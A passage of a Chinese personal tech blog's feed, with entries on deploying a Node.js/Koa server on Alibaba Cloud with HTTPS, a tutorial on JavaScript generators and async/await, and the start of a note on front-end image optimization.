      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;lin
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>阿里云服务器使用</title>
    <link href="http://yoohannah.github.io/post/knowledge/aliyun.html"/>
    <id>http://yoohannah.github.io/post/knowledge/aliyun.html</id>
    <published>2018-05-01T13:42:37.000Z</published>
    <updated>2018-05-01T13:42:17.739Z</updated>
    
    <content type="html"><![CDATA[<h2 id="购买云服务器"><a href="#购买云服务器" class="headerlink" title="购买云服务器"></a>购买云服务器</h2><p>按照网站指引，配置服务器相关参数，提交订单，付钱</p>
<p>需要注意的是镜像就是将来在服务上安装的操作系统<br>如果这里选错，稍后还可以更换</p>
<h2 id="更换镜像"><a href="#更换镜像" class="headerlink" title="更换镜像"></a>更换镜像</h2><p>相当于更换操作系统<br><a href="https://help.aliyun.com/document_detail/25436.html?spm=a2c4g.11186623.4.1.mKmERm" target="_blank" rel="external">更换操作系统</a><br><a href="https://help.aliyun.com/document_detail/50134.html?spm=a2c4g.11186623.6.672.mQB0bF" target="_blank" rel="external">更换系统盘(公共镜像)</a></p>
<h2 id="部署阿里云"><a href="#部署阿里云" class="headerlink" title="部署阿里云"></a>部署阿里云</h2><p>在云端服务器搭建nodejs开发环境<br><a href="https://help.aliyun.com/document_detail/25425.html?spm=a2c4g.11186623.2.5.Hiallm" target="_blank" rel="external">远程连接ECS实例</a><br><a href="https://help.aliyun.com/document_detail/25426.html?spm=a2c4g.11186623.6.598.RIGXvB" target="_blank" rel="external">分盘</a><br><a href="https://help.aliyun.com/document_detail/50775.html?spm=a2c4g.11186623.6.758.RZeQeh" target="_blank" rel="external">部署Node.js项目（CentOS）</a><br><a href="https://blog.csdn.net/u014066037/article/details/70224780" target="_blank" rel="external">安装git(仅供参考)</a></p>
<h2 id="部署自己的项目"><a href="#部署自己的项目" class="headerlink" title="部署自己的项目"></a>部署自己的项目</h2><p>安装好开发环境后就可以像在本地运行项目一样克隆项目运行项目</p>
<h2 id="域名备案"><a href="#域名备案" class="headerlink" title="域名备案"></a>域名备案</h2><p>我们在购买域名后，还要对域名进行备案<br><a href="https://beian.aliyun.com/order/index?spm=5176.8087400.600752.3.389615c9UqjZyz" target="_blank" rel="external">域名备案系统</a><br>按照流程进行备案即可</p>
<h2 id="http转https"><a href="#http转https" class="headerlink" title="http转https"></a>http转https</h2><p><a href="https://dc.console.aliyun.com/next/index#/domain/list/all-domain" target="_blank" rel="external">域名控制台</a></p>
<p>我们需要购买云盾证书服务<br><a href="https://common-buy.aliyun.com/?spm=5176.7968328.911106.btn1.2f194ebfXX6t9Q&amp;commodityCode=cas#/buy" target="_blank" rel="external">购买页面</a><br>在专业版OV SSL下选择品牌Symantec,<br>然后保护类型选择1个域名<br>会发现证书类型出现‘免费型DV SSL’,选择这个就可以买到免费证书</p>
<p>购买后根据申请流程填写资料等待流程走完就可以拿到证书<br>注意1.购买的域名在云解析DNS服务中又绑定，DNS会自动生成映射，2.选择系统生成CSR</p>
<p>拿到证书后<br>在<a href="https://yundun.console.aliyun.com/?spm=5176.2020520163.aliyun_sidebar.19.22cf2b7auXL2bL&amp;p=cas#/cas/home" target="_blank" rel="external">CA证书管理页面</a>可以下载到xxxxx.key,xxxx.pem文件</p>
<p>因为我这里用nodejs搭建服务器，所以只需将文件放入项目，修改项目文件为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">const Koa = require(&apos;koa&apos;);</div><div class="line">const fs = require(&apos;fs&apos;);</div><div class="line">const https = require(&apos;https&apos;);</div><div class="line">const http = require(&apos;http&apos;);</div><div class="line">var enforceHttps = require(&apos;koa-sslify&apos;);</div><div class="line"></div><div class="line">const app = new Koa();</div><div class="line"></div><div class="line">//将http请求强制转换成https请求</div><div class="line">app.use(enforceHttps());</div><div class="line"></div><div class="line">var options = &#123;</div><div class="line">    key: fs.readFileSync(&apos;./ssl/214645895910665.key&apos;),</div><div class="line">    cert: fs.readFileSync(&apos;./ssl/214645895910665.pem&apos;)</div><div class="line">&#125;;</div><div class="line"></div><div class="line">http.createServer(app.callback()).listen(80);</div><div class="line">https.createServer(options, app.callback()).listen(443);</div><div class="line">console.log(&apos;server is running....&apos;);</div></pre></td></tr></table></figure></p>
<p>还要注意安全组有没有设置放行https的443端口<br>进入云服务器控制台<br>网络和安全下安全组, 点击配置规则, 进入规则列表<br>如果没有443端口，则点击添加安全组规则，端口设置为443即可</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;购买云服务器&quot;&gt;&lt;a href=&quot;#购买云服务器&quot; class=&quot;headerlink&quot; title=&quot;购买云服务器&quot;&gt;&lt;/a&gt;购买云服务器&lt;/h2&gt;&lt;p&gt;按照网站指引，配置服务器相关参数，提交订单，付钱&lt;/p&gt;
&lt;p&gt;需要注意的是镜像就是将来在服务上安装的操作系
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>异步函数generator和async</title>
    <link href="http://yoohannah.github.io/post/knowledge/generator.html"/>
    <id>http://yoohannah.github.io/post/knowledge/generator.html</id>
    <published>2018-03-28T09:38:37.000Z</published>
    <updated>2018-03-28T09:38:52.527Z</updated>
    
    <content type="html"><![CDATA[<h1 id="generator-yield-next"><a href="#generator-yield-next" class="headerlink" title="generator/yield/next"></a>generator/yield/next</h1><p>generator函数即生成器函数，可以理解为用于产生生成器的函数<br>yield 关键字是只能用于generator函数，作为异步断点，相当于continue+return功能<br>next 关键字是生成器用于执行生成器函数的关键字，<br>即每调用一次，执行到yield定义的语句，把yield 后面的表达式结果当做返回值返回来<br>如果调用时传递了参数，则覆盖上次yield 的结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">function* helloworld()&#123;</div><div class="line">	yield &apos;hello&apos;;</div><div class="line">	yield &apos;world&apos;;</div><div class="line">	let aa = 0;</div><div class="line">	let a = yield aa++; //yield赋值不用小括号</div><div class="line">	console.log(a);</div><div class="line">	yield 123+1;</div><div class="line">	console.log(&apos;Hello&apos; + (yield 123)); //使用yield表达式用小括号</div><div class="line">	return &apos;endig&apos;;</div><div class="line">&#125;</div><div class="line">let obj = helloworld();//并不会执行generator函数，只是生成生成器</div><div class="line">obj.next();//&#123;value: &quot;hello&quot;, done: false&#125;</div><div class="line">obj.next();//&#123;value: &quot;world&quot;, done: false&#125;</div><div class="line">obj.next();//&#123;value: 0, done: false&#125;</div><div class="line">obj.next(&apos;456&apos;);// 456 &#123;value: 124, done: false&#125; 如果不传值的话，a的值为undefined</div><div class="line">obj.next();//&#123;value: 123, done: false&#125;</div><div class="line">obj.next();// Helloundefined &#123;value: &quot;endig&quot;, done: true&#125;; 不传参，yield返回undefined</div></pre></td></tr></table></figure></p>
<p>next()是将yield表达式替换成一个值。<br>throw()是将yield表达式替换成一个return语句。<br>return()是将yield表达式替换成一个return语句。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">const g = function* (x, y) &#123;</div><div class="line">  let result = yield x + y;</div><div class="line">  return result;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">const gen = g(1, 2);</div><div class="line">gen.next(); // Object &#123;value: 3, done: false&#125;</div><div class="line"></div><div class="line">gen.next(1); // Object &#123;value: 1, done: true&#125;</div><div class="line">// 相当于将 let result = yield x + y</div><div class="line">// 替换成 let result = 1;</div><div class="line"></div><div class="line">gen.throw(new Error(&apos;出错了&apos;)); // Uncaught Error: 出错了</div><div class="line">// 相当于将 let result = yield x + y</div><div class="line">// 替换成 let result = throw(new Error(&apos;出错了&apos;));</div><div class="line"></div><div class="line">gen.return(2); // Object &#123;value: 2, done: true&#125;</div><div class="line">// 相当于将 let result = yield x + y</div><div class="line">// 替换成 let result = return 2;</div></pre></td></tr></table></figure></p>
<p>如果yield表达式后面跟的是一个遍历器对象，需要在yield表达式后面加上星号，表明它返回的是一个遍历器对象。这被称为yield<em>表达式<br>yield</em>后面的 Generator 函数（没有return语句时），等同于在 Generator 函数内部，部署一个for…of循环。<br>for…of循环可以自动遍历Generator函数时生成的Iterator对象，且此时不再需要调用next方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">例1</div><div class="line">function* inner() &#123;</div><div class="line">  yield &apos;hello!&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function* outer1() &#123;</div><div class="line">  yield &apos;open&apos;;</div><div class="line">  yield inner();</div><div class="line">  yield &apos;close&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var gen = outer1()</div><div class="line">gen.next().value // &quot;open&quot;</div><div class="line">gen.next().value // 返回一个遍历器对象</div><div class="line">gen.next().value // &quot;close&quot;</div><div class="line"></div><div class="line">function* outer2() &#123;</div><div class="line">  yield &apos;open&apos;</div><div class="line">  yield* inner()</div><div class="line">  yield &apos;close&apos;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var gen = outer2()</div><div class="line">gen.next().value // &quot;open&quot;</div><div class="line">gen.next().value // &quot;hello!&quot;</div><div class="line">gen.next().value // &quot;close&quot;</div><div class="line"></div><div class="line">例2</div><div class="line">let delegatedIterator = (function* () &#123;</div><div class="line">  yield &apos;Hello!&apos;;</div><div class="line">  yield &apos;Bye!&apos;;</div><div class="line">&#125;());</div><div class="line"></div><div class="line">let delegatingIterator = (function* () &#123;</div><div class="line">  yield &apos;Greetings!&apos;;</div><div class="line">  yield* delegatedIterator;</div><div class="line">  yield &apos;Ok, bye.&apos;;</div><div class="line">&#125;());</div><div class="line"></div><div class="line">for(let value of delegatingIterator) &#123;</div><div class="line">  console.log(value);</div><div class="line">&#125;</div><div class="line">// &quot;Greetings!</div><div class="line">// &quot;Hello!&quot;</div><div class="line">// &quot;Bye!&quot;</div><div class="line">// &quot;Ok, bye.&quot;</div></pre></td></tr></table></figure></p>
<p>如果yield*后面跟着一个数组，由于数组原生支持遍历器，因此就会遍历数组成员。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">function* gen()&#123;</div><div class="line">  yield* [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;];</div><div class="line">&#125;</div><div class="line"></div><div class="line">gen().next() // &#123; value:&quot;a&quot;, done:false &#125;</div></pre></td></tr></table></figure></p>
<p>上面代码中，yield命令后面如果不加星号，返回的是整个数组，加了星号就表示返回的是数组的遍历器对象。</p>
<p>Generator 函数返回的遍历器对象，可以继承prototype,但不能当做普通构造函数,不会返回this<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div></pre></td><td class="code"><pre><div class="line">function* g() &#123;</div><div class="line">  this.a = 11;</div><div class="line">&#125;</div><div class="line"></div><div class="line">let obj = g();</div><div class="line">obj.next();</div><div class="line">obj.a // undefined</div><div class="line">//可以进行改造</div><div class="line">//执行的是遍历器对象f，但是生成的对象实例是obj</div><div class="line">function* F() &#123;</div><div class="line">  this.a = 1;</div><div class="line">  yield this.b = 2;</div><div class="line">  yield this.c = 3;</div><div class="line">&#125;</div><div class="line">var f = F.call(F.prototype);</div><div class="line"></div><div class="line">f.next();  // Object &#123;value: 2, done: false&#125;</div><div class="line">f.next();  // Object &#123;value: 3, done: false&#125;</div><div class="line">f.next();  // Object &#123;value: undefined, done: true&#125;</div><div class="line"></div><div class="line">f.a // 1</div><div class="line">f.b // 2</div><div class="line">f.c // 3</div><div class="line"></div><div class="line">function* F() &#123;</div><div class="line">  this.a = 1;</div><div class="line">  yield this.b = 2;</div><div class="line">  yield this.c = 3;</div><div class="line">&#125;</div><div class="line">var f = F.call(F.prototype);</div><div class="line"></div><div class="line">f.next();  // Object &#123;value: 2, done: false&#125;</div><div class="line">f.next();  // Object &#123;value: 3, done: false&#125;</div><div class="line">f.next();  // Object &#123;value: undefined, done: true&#125;</div><div class="line"></div><div class="line">f.a // 1</div><div class="line">f.b // 2</div><div class="line">f.c // 3</div><div class="line">function* gen() &#123;</div><div class="line">  this.a = 1;</div><div class="line">  yield this.b = 2;</div><div class="line">  yield this.c = 3;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function F() &#123;</div><div class="line">  return gen.call(gen.prototype);</div><div class="line">&#125;</div><div class="line"></div><div class="line">var f = new F();</div><div class="line"></div><div class="line">f.next();  // Object &#123;value: 2, done: false&#125;</div><div class="line">f.next();  // Object &#123;value: 3, done: false&#125;</div><div class="line">f.next();  // Object &#123;value: undefined, done: true&#125;</div><div class="line"></div><div class="line">f.a // 1</div><div class="line">f.b // 2</div><div class="line">f.c // 3</div></pre></td></tr></table></figure></p>
<h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><h3 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">var clock = function*() &#123;</div><div class="line">  while (true) &#123;</div><div class="line">    console.log(&apos;Tick!&apos;);</div><div class="line">    yield;</div><div class="line">    console.log(&apos;Tock!&apos;);</div><div class="line">    yield;</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h3 id="异步操作的同步化写法"><a href="#异步操作的同步化写法" class="headerlink" title="异步操作的同步化写法"></a>异步操作的同步化写法</h3><p>IMPORTANT!!!</p>
<p>Generator函数的暂停执行的效果，意味着可以把异步操作写在yield语句里面，等到调用next方法时再往后执行。这实际上等同于不需要写回调函数了，因为异步操作的后续操作可以放在yield语句下面，反正要等到调用next方法时再执行。所以，Generator函数的一个重要实际意义就是用来处理异步操作，改写回调函数。</p>
<p>只有当yield后面跟的函数先执行完，无论执行体里面有多少异步回调，都要等所有回调先执行完，才会执行等号赋值，以及再后面的操作。这也是yield最大的特性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">function request(url) &#123;</div><div class="line">  $.get(url, function(response)&#123;</div><div class="line">    it.next(response);</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function* ajaxs() &#123;</div><div class="line">    console.log(yield request(&apos;a.html&apos;));</div><div class="line">    console.log(yield request(&apos;b.html&apos;));</div><div class="line">    console.log(yield request(&apos;c.html&apos;));</div><div class="line">&#125;</div><div class="line"></div><div class="line">var it = ajaxs();</div><div class="line"></div><div class="line">it.next();</div><div class="line"></div><div class="line">// a.html</div><div class="line">// b.html</div><div class="line">// c.html</div></pre></td></tr></table></figure>
<p>第1步：将所有异步代码的每一步都封装成一个普通的、可以有参数的函数，比如上面的request函数。上面例子三个异步代码却只定义了一个request函数,因为request函数能复用。如果不能复用的话，请老老实实定义三个普通函数，函数内容就是需要执行的异步代码。</p>
<p>第2步：定义一个生成器函数，把流程写进去，完全的同步代码的写法。生成器函数可以有参数。</p>
<p>第三步：定义一个变量，赋值为迭代器对象。迭代器对象可以加参数，参数通常将作为流程所需的初始值。</p>
<p>第四步：变量名.next()。不要给这个next()传参数，传了也没用，因为它找不到上一个yield语句。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">//在上述每一步异步中间，都间隔3秒</div><div class="line">function request(url) &#123;</div><div class="line">  $.get(url, function(response)&#123;</div><div class="line">    it.next(response);</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function sleep(time) &#123;</div><div class="line">  setTimeout(function() &#123;</div><div class="line">    console.log(&apos;I\&apos;m awake.&apos;);</div><div class="line">    it.next();</div><div class="line">  &#125;, time);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function* ajaxs(ur) &#123;</div><div class="line">    console.log(yield request(ur));</div><div class="line">    yield sleep(3000);</div><div class="line">    console.log(yield request(&apos;b.html&apos;));</div><div class="line">    yield sleep(3000);</div><div class="line">    console.log(yield request(&apos;c.html&apos;));</div><div class="line">&#125;</div><div class="line"></div><div class="line">var it = ajaxs(&apos;a.html&apos;);</div><div class="line"></div><div class="line">it.next();</div></pre></td></tr></table></figure>
<p><a href="https://www.jianshu.com/p/e0778b004596" target="_blank" rel="external">参考资料</a><br><a href="http://es6.ruanyifeng.com/#docs/generator" target="_blank" rel="external">参考资料</a></p>
<h1 id="async-await"><a href="#async-await" class="headerlink" title="async/await"></a>async/await</h1><p>async 用于定义异步函数，相当于generator的*号,只不过async函数不需要像generator那样用next()去出发，只需要调用就能实现异步<br>await 用于async函数内部，作用是等待await 后面的异步流程结束后，执行asyn函数接下来的语句，相当于暂停符</p>
<p>async返回promise对象，因此可以连接then()或者catch()继续进行异步操作或者捕获错误<br>async函数内部return语句返回的值，会成为then方法回调函数的参数。<br>async函数返回的 Promise 对象，必须等到内部所有await命令后面的 Promise 对象执行完，才会发生状态改变，<br>除非遇到return语句或者抛出错误。<br>也就是说，只有async函数内部的异步操作执行完，才会执行then方法指定的回调函数。</p>
<p>正常情况下，await命令后面是一个 Promise 对象。如果不是，会被转成一个立即resolve的 Promise 对象。即可以等任意表达式的结果<br>因此 await 返回异步函数return的结果，或者异步函数返回的promise的resolve的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">如果它等到的不是一个 Promise 对象，那 await 表达式的运算结果就是它等到的东西。</div><div class="line"></div><div class="line">如果它等到的是一个 Promise 对象，await 就忙起来了，它会阻塞后面的代码，等着 Promise 对象 resolve，然后得到 resolve 的值，作为 await 表达式的运算结果。</div></pre></td></tr></table></figure></p>
<p>只要一个await语句后面的 Promise 变为reject，那么整个async函数都会中断执行。<br>解决中断执行的方法有两种，<br>一种是把await放在try…catch…里面,例5<br>另一种是给await的promise链接catch{},例6</p>
<p>优化：如果两个异步操作没有任何联系，不存在继发关系，最好让他们同时触发 例8，例9</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div></pre></td><td class="code"><pre><div class="line">例1.</div><div class="line">async function lala(val)&#123;</div><div class="line">  let aa = await lili(val);</div><div class="line">  console.log(aa);//&apos;red&apos;</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line">function lili(val)&#123;</div><div class="line">	return new Promise((resolve,reject)=&gt;&#123;</div><div class="line">		resolve(&apos;red&apos;)</div><div class="line">&#125;)</div><div class="line">&#125;</div><div class="line">lala(&apos;kk&apos;).then(</div><div class="line">val=&gt;console.log(val),//0</div><div class="line">err=&gt;console.log(11111,err) //如果promise发生reject会传递到这里</div><div class="line">);</div><div class="line">例2.</div><div class="line">async function lala(val)&#123;</div><div class="line">  let aa = await lili(val);</div><div class="line">  let bb = await bebe(val);</div><div class="line">  console.log(aa);</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line">function lili(val)&#123;</div><div class="line">	return new Promise((resolve,reject)=&gt;&#123;</div><div class="line">		resolve(&apos;red&apos;)</div><div class="line">&#125;)</div><div class="line">&#125;</div><div class="line">function bebe(val)&#123;</div><div class="line">	return new Promise((resolve,reject)=&gt;&#123;</div><div class="line">		reject(&apos;err&apos;) //产生错误</div><div class="line">&#125;)</div><div class="line">&#125;</div><div class="line">lala(&apos;kk&apos;).then(</div><div class="line">val=&gt;console.log(val),</div><div class="line">err=&gt;console.log(11111,err) //11111 &quot;err&quot; 只会打印这一处</div><div class="line">);</div><div class="line"></div><div class="line">例3.</div><div class="line">async function f() &#123;</div><div class="line">  return await 123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">f().then(v =&gt; console.log(v))</div><div class="line"></div><div class="line">例4.</div><div class="line">async function f() &#123;</div><div class="line">  await Promise.reject(&apos;出错了&apos;);</div><div class="line">  await Promise.resolve(&apos;hello world&apos;); // 不会执行</div><div class="line">&#125;</div><div class="line"></div><div class="line">例5.</div><div class="line">async function f() &#123;</div><div class="line">  try &#123;</div><div class="line">    await Promise.reject(&apos;出错了&apos;);</div><div class="line">  &#125; catch(e) &#123;</div><div class="line">  &#125;</div><div class="line">  return await Promise.resolve(&apos;hello world&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">f()</div><div class="line">.then(v =&gt; console.log(v))</div><div class="line">// hello world</div><div class="line"></div><div class="line">例6，</div><div class="line">async function f() &#123;</div><div class="line">  await Promise.reject(&apos;出错了&apos;)</div><div class="line">    .catch(e =&gt; console.log(e));</div><div class="line">  return await Promise.resolve(&apos;hello world&apos;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">f()</div><div class="line">.then(v =&gt; console.log(v))</div><div class="line">// 出错了</div><div class="line">// hello world</div><div class="line"></div><div class="line">例7. //同例5例6</div><div class="line"></div><div class="line">async function myFunction() &#123;</div><div class="line">  try &#123;</div><div class="line">    await somethingThatReturnsAPromise();</div><div class="line">  &#125; catch (err) &#123;</div><div class="line">    console.log(err);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">// 另一种写法</div><div class="line"></div><div class="line">async function myFunction() &#123;</div><div class="line">  await somethingThatReturnsAPromise()</div><div class="line">  .catch(function (err) &#123;</div><div class="line">    console.log(err);</div><div class="line">  &#125;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">例8</div><div class="line">//原来</div><div class="line">let foo = await getFoo();</div><div class="line">let bar = await getBar();</div><div class="line">//优化</div><div class="line">// 写法一</div><div class="line">let [foo, bar] = await Promise.all([getFoo(), getBar()]);</div><div class="line"></div><div class="line">// 写法二</div><div class="line">let fooPromise = getFoo();</div><div class="line">let barPromise = getBar();</div><div class="line">let foo = await fooPromise;</div><div class="line">let bar = await barPromise;</div><div class="line"></div><div class="line">例9</div><div class="line">async function logInOrder(urls) &#123;</div><div class="line">  // 并发读取远程URL</div><div class="line">  const textPromises = urls.map(async url =&gt; &#123;</div><div class="line">    const response = await fetch(url);</div><div class="line">    return response.text();</div><div class="line">  &#125;);</div><div class="line"></div><div class="line">  // 按次序输出</div><div class="line">  for (const textPromise of textPromises) &#123;</div><div class="line">    console.log(await textPromise);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><a href="http://es6.ruanyifeng.com/#docs/async" target="_blank" rel="external">参考资料</a><br><a href="https://segmentfault.com/a/1190000007535316" target="_blank" rel="external">相关资料</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;generator-yield-next&quot;&gt;&lt;a href=&quot;#generator-yield-next&quot; class=&quot;headerlink&quot; title=&quot;generator/yield/next&quot;&gt;&lt;/a&gt;generator/yield/next&lt;/h1&gt;&lt;
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>关于性能优化</title>
    <link href="http://yoohannah.github.io/post/knowledge/optimization.html"/>
    <id>http://yoohannah.github.io/post/knowledge/optimization.html</id>
    <published>2018-03-24T01:16:02.000Z</published>
    <updated>2018-03-24T01:16:21.442Z</updated>
    
    <content type="html"><![CDATA[<h1 id="优化哪些方面"><a href="#优化哪些方面" class="headerlink" title="优化哪些方面"></a>优化哪些方面</h1><p>加载速度<br>呈现效果</p>
<h1 id="图片的优化"><a href="#图片的优化" class="headerlink" title="图片的优化"></a>图片的优化</h1><p>常见图片有三类<br>矢量图：几何图形<br>位图：像素<br>交错图：随加载过程模糊到清晰</p>
<p>使用策略<br>·是否有必要使用图片（可不可以不使用；效果能不能用CSS代替–&gt;套路大列表）<br>·使用合适的格式（小体积webp；矢量图&gt;位图；内容jpeg,修饰png,动画video/svg&gt;gif）</p>
